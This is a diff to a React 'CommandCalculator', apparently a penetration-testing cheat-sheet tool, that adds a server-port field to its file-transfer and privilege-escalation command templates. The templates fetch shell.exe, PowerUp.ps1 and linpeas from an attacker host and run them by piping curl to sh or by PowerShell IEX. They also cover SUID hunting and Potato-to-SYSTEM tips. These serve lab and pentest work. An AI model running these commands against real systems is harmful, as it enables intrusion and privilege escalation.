@@ -17,6 +17,7 @@ const FIELDS = [
   { k: "secret", label: "Password / Hash", ph: "Password123!" },
   { k: "lhost", label: "LHOST (tun0)", ph: "10.10.14.7" },
   { k: "lport", label: "LPORT", ph: "4444" },
+  { k: "srvport", label: "SRV PORT", ph: "80" },
 ];
 // fields that count toward "ready" (lport has a working default, so it's exempt)
 const CORE = ["ip", "dcip", "host", "domain", "user", "secret", "lhost"];
@@ -27,7 +28,7 @@ const AUTH = [
   { id: "krb", label: "Kerberos" },
 ];
 
-const BLANK = () => ({ ip: "", dcip: "", host: "", domain: "", user: "", secret: "", lhost: "", lport: "" });
+const BLANK = () => ({ ip: "", dcip: "", host: "", domain: "", user: "", secret: "", lhost: "", lport: "", srvport: "" });
 const newHost = (name) => ({ id: `h_${Date.now()}_${Math.random().toString(36).slice(2, 6)}`, name, fields: BLANK() });
 
 // persistence — localStorage in the deployed Vite app. Wrapped so SSR / blocked
@@ -192,6 +193,7 @@ export default function CommandCalculator() {
   const SEC = tok(f.secret, "$pass", authMode === "hash" ? "<HASH>" : "<PASS>");
   const LHOST = tok(f.lhost, "$lhost", "<LHOST>");
   const LPORT = V ? (f.lport ? "$lport" : "4444") : (f.lport || "4444");
+  const SRVPORT = V ? (f.srvport ? "$srvport" : "80") : (f.srvport || "80");
   const baseDN = V
     ? (f.domain ? "$baseDN" : "dc=<DOMAIN>")
     : (f.domain ? f.domain.split(".").map((p) => `dc=${p}`).join(",") : "dc=<DOMAIN>");
@@ -210,7 +212,7 @@ export default function CommandCalculator() {
     if (!V) return null;
     const real = {
       ip: f.ip, dc: f.dcip, host: f.host, domain: f.domain, user: f.user,
-      lhost: f.lhost, lport: f.lport,
+      lhost: f.lhost, lport: f.lport, srvport: f.srvport,
     };
     const plain = Object.entries(real).filter(([, v]) => v).map(([k, v]) => `${k}=${v}`);
     const lines = [];
@@ -492,13 +494,13 @@ export default function CommandCalculator() {
     transfer: {
       name: "File Transfer", groups: [
         { phase: "Serve", cmds: [
-          { label: "HTTP server (Kali)", cmd: `python3 -m http.server 80` },
+          { label: "HTTP server (Kali)", cmd: `python3 -m http.server ${SRVPORT}`, note: "SRV PORT field feeds every pull command below — keep it in sync." },
           { label: "SMB server (impacket)", cmd: `impacket-smbserver share $(pwd) -smb2support -user kali -password kali` },
         ]},
         { phase: "Pull (on target)", cmds: [
-          { label: "Windows — certutil", cmd: `certutil -urlcache -f http://${LHOST}/shell.exe shell.exe` },
-          { label: "Windows — PowerShell iwr", cmd: `iwr -Uri http://${LHOST}/shell.exe -OutFile shell.exe` },
-          { label: "Linux — wget", cmd: `wget http://${LHOST}/linpeas.sh -O /tmp/linpeas.sh && chmod +x /tmp/linpeas.sh` },
+          { label: "Windows — certutil", cmd: `certutil -urlcache -f http://${LHOST}:${SRVPORT}/shell.exe shell.exe`, note: "Hit the url toggle for the browser-webshell encoded form." },
+          { label: "Windows — PowerShell iwr", cmd: `iwr -Uri http://${LHOST}:${SRVPORT}/shell.exe -OutFile shell.exe` },
+          { label: "Linux — wget", cmd: `wget http://${LHOST}:${SRVPORT}/linpeas.sh -O /tmp/linpeas.sh && chmod +x /tmp/linpeas.sh` },
         ]},
       ],
     },
@@ -508,7 +510,7 @@ export default function CommandCalculator() {
           { label: "Token privileges", cmd: `whoami /priv`, note: "SeImpersonate/SeAssignPrimaryToken → Potato to SYSTEM. SeBackup/SeRestore → dump SAM." },
           { label: "Groups + context", cmd: `whoami /all\nnet user %username%` },
           { label: "winPEAS", cmd: `.\\winPEASx64.exe` },
-          { label: "PowerUp checks", cmd: `powershell -ep bypass -c "IEX(New-Object Net.WebClient).DownloadString('http://${LHOST}/PowerUp.ps1'); Invoke-AllChecks"` },
+          { label: "PowerUp checks", cmd: `powershell -ep bypass -c "IEX(New-Object Net.WebClient).DownloadString('http://${LHOST}:${SRVPORT}/PowerUp.ps1'); Invoke-AllChecks"` },
           { label: "Quick wins (services/unquoted)", cmd: `accesschk.exe -uwcqv "Users" *\nwmic service get name,displayname,pathname,startmode | findstr /i /v "C:\\Windows"`, note: "Unquoted path with a space + writable parent dir = binary-planting hijack." },
         ]},
         { phase: "SeImpersonate → SYSTEM (potatoes)", cmds: [
@@ -536,7 +538,7 @@ export default function CommandCalculator() {
           { label: "sudo rights", cmd: `sudo -l`, note: "Anything here → check GTFOBins for the binary." },
           { label: "SUID binaries", cmd: `find / -perm -4000 -type f 2>/dev/null`, note: "Cross-ref each against GTFOBins 'SUID' section." },
           { label: "Capabilities", cmd: `getcap -r / 2>/dev/null`, note: "cap_setuid on python/perl = instant root." },
-          { label: "linpeas", cmd: `curl http://${LHOST}/linpeas.sh | sh`, note: "Or wget to /tmp, chmod +x, run with 'sh'." },
+          { label: "linpeas", cmd: `curl http://${LHOST}:${SRVPORT}/linpeas.sh | sh`, note: "Or wget to /tmp, chmod +x, run with 'sh'." },
           { label: "Writable cron / pspy", cmd: `cat /etc/crontab\nls -la /etc/cron.*\n./pspy64`, note: "pspy shows root cron jobs with no log access needed." },
         ]},
         { phase: "GTFOBins escalation", cmds: [
